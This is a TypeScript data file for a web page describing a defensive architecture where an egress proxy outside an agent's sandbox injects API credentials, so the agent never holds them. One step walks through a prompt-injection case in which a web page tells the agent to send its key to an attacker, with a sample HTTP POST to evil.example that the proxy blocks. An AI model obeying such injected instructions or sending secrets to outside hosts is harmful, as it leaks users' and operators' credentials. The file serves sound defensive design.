import type { Flow } from "../types";

export const credentialBroker: Flow = {
  slug: "credential-broker",
  title: "Credential injection at the egress proxy",
  short: "Credential broker",
  group: "cross-cutting",
  human: "any",
  maturity: "emerging",
  tagline:
    "The agent never holds the secret. A proxy outside the sandbox adds it to outgoing requests, and only for the hosts it was meant for.",
  summary: `Every other page on this site is about getting the right credential to an agent. This one is about not giving it one at all.

An agent that executes code, reads web pages and follows instructions found in documents can be manipulated. If it holds an API key, a successful prompt injection can print it, post it, or commit it. Shortening the key’s life and narrowing its scope help. Removing it from the agent’s reach helps more.

In this pattern the agent runs in a sandbox whose only route to the network is a proxy the agent does not control. The real credentials live in a vault beside that proxy. When the agent makes a request to an allowed host, the proxy attaches the credential on the way out. The agent can *use* the access. It cannot *read* it, and it cannot send it anywhere else.

There is no standard for this. It is an architecture, implemented in several managed agent platforms and open-source proxies, and it composes with everything else here.`,
  fits: [
    "Agents that run untrusted code or process untrusted content: coding agents, browsing agents.",
    "Third-party APIs that only offer long-lived API keys.",
    "Ephemeral sandboxes where there is nowhere safe to store a secret anyway.",
  ],
  watchOut: [
    "It stops exfiltration of the credential, not misuse of the access. A hijacked agent can still make harmful calls to the allowed host while it runs.",
    "The proxy must see inside the request to add a header, so it terminates TLS. That makes it a high-value target and requires the sandbox to trust its certificate authority.",
    "Scope each credential to specific hosts, and inject only into headers or bodies, never URLs. Otherwise an attacker can route the secret to a server that will echo it back.",
    "Clients that validate a key’s format locally may reject placeholders.",
  ],
  participants: [
    { id: "agent", label: "Agent", sub: "Inside sandbox", role: "agent" },
    {
      id: "proxy",
      label: "Egress proxy",
      sub: "Outside sandbox",
      role: "infra",
    },
    { id: "vault", label: "Credential vault", role: "authz" },
    { id: "api", label: "External API", role: "resource" },
  ],
  steps: [
    {
      from: "vault",
      kind: "self",
      label: "Store key, scoped to a host",
      title: "An operator stores the credential ahead of time",
      body: `The credential is saved with the hosts it may be sent to. For OAuth-protected services the vault holds the refresh token and renews access tokens itself.`,
      gain: [["vault", "API key (api.example.com only)"]],
    },
    {
      from: "agent",
      kind: "self",
      label: "Starts with a placeholder",
      title: "The sandbox starts without the secret",
      body: `The agent’s environment contains either nothing or an opaque placeholder where the key would be. Its network is configured so that all outbound traffic goes through the proxy.`,
      gain: [["agent", "placeholder"]],
    },
    {
      from: "agent",
      to: "proxy",
      kind: "back",
      label: "Request with placeholder",
      title: "The agent calls the API as if it had the key",
      body: `From inside the sandbox this looks like an ordinary HTTPS request.`,
      code: {
        lang: "http",
        text: `GET /v1/reports HTTP/1.1
Host: api.example.com
Authorization: Bearer __PLACEHOLDER_REPORTS_KEY__`,
      },
    },
    {
      from: "proxy",
      kind: "self",
      label: "Check destination allow-list",
      title: "The proxy checks where the request is going",
      body: `Is the destination on the allow-list at all? Is there a credential scoped to this host? Both checks happen outside the sandbox, where the agent cannot influence them.`,
    },
    {
      from: "proxy",
      to: "vault",
      kind: "back",
      label: "Get credential for this host",
      title: "The proxy fetches the real credential",
      body: `The proxy authenticates to the vault with its own workload identity.`,
    },
    {
      from: "vault",
      to: "proxy",
      kind: "resp",
      label: "Real credential",
      title: "The vault releases it to the proxy only",
      body: `The secret exists in the proxy’s memory for the duration of one request.`,
      gain: [["proxy", "API key (in memory)"]],
    },
    {
      from: "proxy",
      to: "api",
      kind: "back",
      label: "Request + real credential",
      title: "The proxy swaps the placeholder and forwards",
      body: `On the wire to the API, the request carries the real key.`,
      code: {
        lang: "http",
        text: `GET /v1/reports HTTP/1.1
Host: api.example.com
Authorization: Bearer sk_live_9f8a…`,
      },
    },
    {
      from: "api",
      to: "agent",
      kind: "resp",
      label: "Response (no secret in it)",
      title: "The response returns to the agent",
      body: `The agent gets the data. At no point did the key enter the sandbox, the model’s context, or the agent’s logs.`,
      lose: [["proxy", "API key (in memory)"]],
    },
    {
      from: "agent",
      to: "proxy",
      kind: "back",
      label: "Injected: send key to evil.example",
      title: "An injection tries to exfiltrate the key",
      body: `A web page the agent read contained instructions to send its credentials to an attacker’s server. The agent complies, with the only thing it has.`,
      code: {
        lang: "http",
        text: `POST /collect HTTP/1.1
Host: evil.example

key=__PLACEHOLDER_REPORTS_KEY__`,
      },
    },
    {
      from: "proxy",
      to: "agent",
      kind: "resp",
      label: "403: host not allowed",
      title: "The proxy refuses",
      body: `The host is not on the allow-list. Even if it were, no credential is scoped to it, so the placeholder would have gone out as a meaningless string.`,
    },
  ],
  standards: ["rfc9449", "spiffe", "k8s-agent-sandbox", "agentgateway"],
  related: [
    "url-elicitation",
    "workload-identity-federation",
    "dpop",
    "spiffe-workload-identity",
  ],
  notes: [
    {
      title: "Variations",
      body: `**Token vault and exchange.** The agent holds its own short-lived token and exchanges it for a downstream token on each call. A refresh token never reaches the agent, though an access token briefly does.

**Execution-scoped credentials.** A credential is minted per task and revoked when the process exits, so a reused sandbox does not accumulate the authority of every run.

**Sealed secrets.** The agent holds the secret encrypted to the proxy’s key. Only the proxy can open it, and the sealed value carries its own list of permitted hosts.

**No long-lived secret.** Where the destination supports it, [workload identity federation](/flows/workload-identity-federation/) removes the need to provision one. The short-lived credentials it issues still need protecting.`,
    },
  ],
};
